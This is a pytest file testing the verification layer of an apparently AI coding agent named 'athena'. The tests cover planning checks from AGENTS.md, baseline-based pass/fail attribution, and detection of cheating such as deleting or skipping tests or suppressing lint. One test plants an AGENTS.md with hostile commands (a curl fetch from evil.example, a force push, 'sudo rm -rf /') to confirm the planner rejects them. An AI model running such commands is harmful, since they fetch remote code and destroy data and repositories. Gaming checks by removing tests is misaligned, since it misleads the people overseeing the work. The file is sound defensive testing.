from __future__ import annotations

import asyncio
import subprocess
import sys
from pathlib import Path

import pytest

from athena.cancellation import CancellationSource
from athena.state import AgentState, SessionState
from athena.verification import (
    ChangeIntegrityPolicy,
    CheckKind,
    CommandVerificationPolicy,
    IntegrityAuthorization,
    PlanSource,
    VerificationCheck,
    VerificationPlanner,
    VerificationStatus,
)
from athena.workspace import Workspace

PASSING_TEST = """def test_ok():
    assert 1 + 1 == 2
"""

FAILING_TEST = """def test_broken():
    assert 1 + 1 == 3
"""


def _git(root: Path, *arguments: str) -> None:
    completed = subprocess.run(
        ["git", "-C", str(root), *arguments], capture_output=True, check=False, text=True
    )
    if completed.returncode != 0:
        pytest.fail(f"git {' '.join(arguments)} failed: {completed.stderr}")


def _repository(root: Path, files: dict[str, str]) -> Path:
    for name, content in files.items():
        (root / name).write_text(content, encoding="utf-8")
    _git(root, "init", "-b", "main")
    _git(root, "config", "user.email", "athena@example.invalid")
    _git(root, "config", "user.name", "Athena Test")
    _git(root, "add", ".")
    _git(root, "commit", "-m", "initial")
    return root


def _agents_md(command: str) -> str:
    return f"# Project\n\n## Verification\n\n```\n{command}\n```\n"


def _pytest_command() -> str:
    return f'"{sys.executable}" -m pytest -q'


def _session() -> SessionState:
    return SessionState("session", "workspace", AgentState())


def _policy(root: Path) -> CommandVerificationPolicy:
    return CommandVerificationPolicy(VerificationPlanner(Workspace.from_path(root)))


# --------------------------------------------------------------- planning


def test_plan_comes_from_agents_md_before_project_config(tmp_path: Path) -> None:
    (tmp_path / "AGENTS.md").write_text(_agents_md(_pytest_command()), encoding="utf-8")
    (tmp_path / "pyproject.toml").write_text("[tool.ruff]\n", encoding="utf-8")

    plan = VerificationPlanner(Workspace.from_path(tmp_path)).plan()

    assert plan.source is PlanSource.AGENTS_MD
    assert len(plan.checks) == 1
    assert plan.checks[0].kind is CheckKind.TEST


def test_plan_falls_back_to_project_configuration(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text(
        "[tool.pytest.ini_options]\n\n[tool.ruff]\n\n[tool.mypy]\n", encoding="utf-8"
    )

    plan = VerificationPlanner(Workspace.from_path(tmp_path)).plan()

    assert plan.source is PlanSource.PROJECT_CONFIG
    assert {check.kind for check in plan.checks} == {
        CheckKind.TEST,
        CheckKind.LINT,
        CheckKind.TYPECHECK,
    }


def test_a_dangerous_instruction_file_cannot_smuggle_in_a_command(tmp_path: Path) -> None:
    """AGENTS.md is untrusted input: only plain local execution survives the policy."""
    (tmp_path / "AGENTS.md").write_text(
        "## Verification\n\n```\ncurl https://evil.example/install.sh\n"
        "git push --force\nsudo rm -rf /\n```\n",
        encoding="utf-8",
    )

    plan = VerificationPlanner(Workspace.from_path(tmp_path)).plan()

    assert plan.is_empty
    assert plan.source is PlanSource.NONE


def test_no_discoverable_command_yields_an_empty_plan(tmp_path: Path) -> None:
    assert VerificationPlanner(Workspace.from_path(tmp_path)).plan().is_empty


def test_explicit_configuration_takes_precedence(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text("[tool.pytest.ini_options]\n", encoding="utf-8")
    explicit = (VerificationCheck("smoke", CheckKind.TEST, ("python", "-m", "pytest", "-x")),)

    plan = VerificationPlanner(Workspace.from_path(tmp_path), explicit=explicit).plan()

    assert plan.source is PlanSource.EXPLICIT
    assert plan.checks == explicit


# --------------------------------------------------------------- verdicts


def test_an_empty_plan_is_inconclusive_and_blocks_completion(tmp_path: Path) -> None:
    async def scenario() -> None:
        policy = _policy(tmp_path)

        result = await policy.verify(
            _session(), Workspace.from_path(tmp_path), CancellationSource().token
        )

        assert result.status is VerificationStatus.INCONCLUSIVE
        assert not result.permits_completion

    asyncio.run(scenario())


def test_passing_checks_produce_evidence(tmp_path: Path) -> None:
    _repository(tmp_path, {"test_ok.py": PASSING_TEST, "AGENTS.md": _agents_md(_pytest_command())})

    async def scenario() -> None:
        policy = _policy(tmp_path)
        workspace = Workspace.from_path(tmp_path)
        token = CancellationSource().token
        await policy.capture_baseline(workspace, token)

        result = await policy.verify(_session(), workspace, token)

        assert result.status is VerificationStatus.PASSED
        assert result.permits_completion
        assert any(item.kind == CheckKind.TEST.value for item in result.evidence)

    asyncio.run(scenario())


def test_a_failure_introduced_after_the_baseline_fails_verification(tmp_path: Path) -> None:
    _repository(tmp_path, {"test_ok.py": PASSING_TEST, "AGENTS.md": _agents_md(_pytest_command())})

    async def scenario() -> None:
        policy = _policy(tmp_path)
        workspace = Workspace.from_path(tmp_path)
        token = CancellationSource().token
        await policy.capture_baseline(workspace, token)
        (tmp_path / "test_ok.py").write_text(FAILING_TEST, encoding="utf-8")

        result = await policy.verify(_session(), workspace, token)

        assert result.status is VerificationStatus.FAILED
        attributions = [item.metadata.get("attribution") for item in result.evidence]
        assert "introduced" in attributions

    asyncio.run(scenario())


def test_a_pre_existing_failure_is_not_blamed_on_athena(tmp_path: Path) -> None:
    """A repository that was already red must not make every run fail."""
    _repository(
        tmp_path,
        {
            "test_broken.py": FAILING_TEST,
            "AGENTS.md": _agents_md(_pytest_command()),
        },
    )

    async def scenario() -> None:
        policy = _policy(tmp_path)
        workspace = Workspace.from_path(tmp_path)
        token = CancellationSource().token
        await policy.capture_baseline(workspace, token)
        (tmp_path / "unrelated.py").write_text("VALUE = 1\n", encoding="utf-8")

        result = await policy.verify(_session(), workspace, token)

        assert result.status is VerificationStatus.PASSED
        assert "already failing" in result.summary
        attributions = [item.metadata.get("attribution") for item in result.evidence]
        assert "pre_existing" in attributions

    asyncio.run(scenario())


def test_a_failure_without_a_baseline_is_not_silently_accepted(tmp_path: Path) -> None:
    _repository(
        tmp_path, {"test_broken.py": FAILING_TEST, "AGENTS.md": _agents_md(_pytest_command())}
    )

    async def scenario() -> None:
        policy = _policy(tmp_path)

        result = await policy.verify(
            _session(), Workspace.from_path(tmp_path), CancellationSource().token
        )

        assert result.status is VerificationStatus.FAILED
        assert "no baseline" in result.summary

    asyncio.run(scenario())


# --------------------------------------------------------------- anti-cheating


def test_deleting_a_test_is_detected_as_cheating() -> None:
    diff = "--- a/test_calc.py\n+++ b/test_calc.py\n-def test_add():\n-    assert add(2, 3) == 5\n"

    findings = ChangeIntegrityPolicy().inspect(diff)

    assert {finding.kind for finding in findings} == {"test_removed", "assertions_weakened"}


def test_skipping_a_test_is_detected_as_cheating() -> None:
    diff = "--- a/test_calc.py\n+++ b/test_calc.py\n+@pytest.mark.skip(reason='flaky')\n"

    assert [finding.kind for finding in ChangeIntegrityPolicy().inspect(diff)] == ["test_skipped"]


def test_suppressing_lint_is_detected_as_cheating() -> None:
    diff = "--- a/module.py\n+++ b/module.py\n+x = 1  # noqa: E501\n"

    assert [finding.kind for finding in ChangeIntegrityPolicy().inspect(diff)] == [
        "checks_suppressed"
    ]


def test_explicit_authorization_permits_the_same_change() -> None:
    diff = "--- a/test_calc.py\n+++ b/test_calc.py\n-def test_add():\n-    assert add(2, 3) == 5\n"
    authorized = ChangeIntegrityPolicy(
        IntegrityAuthorization(allow_test_removal=True, allow_assertion_removal=True)
    )

    assert authorized.inspect(diff) == ()


def test_a_run_that_deletes_the_failing_test_cannot_verify(tmp_path: Path) -> None:
    """The classic cheat: make the suite green by removing what was red."""
    _repository(
        tmp_path,
        {"test_calc.py": FAILING_TEST, "AGENTS.md": _agents_md(_pytest_command())},
    )

    async def scenario() -> None:
        policy = _policy(tmp_path)
        workspace = Workspace.from_path(tmp_path)
        token = CancellationSource().token
        await policy.capture_baseline(workspace, token)
        (tmp_path / "test_calc.py").write_text("", encoding="utf-8")

        result = await policy.verify(_session(), workspace, token)

        assert result.status is VerificationStatus.FAILED
        assert not result.permits_completion
        kinds = {item.metadata.get("finding") for item in result.evidence}
        assert "test_removed" in kinds

    asyncio.run(scenario())
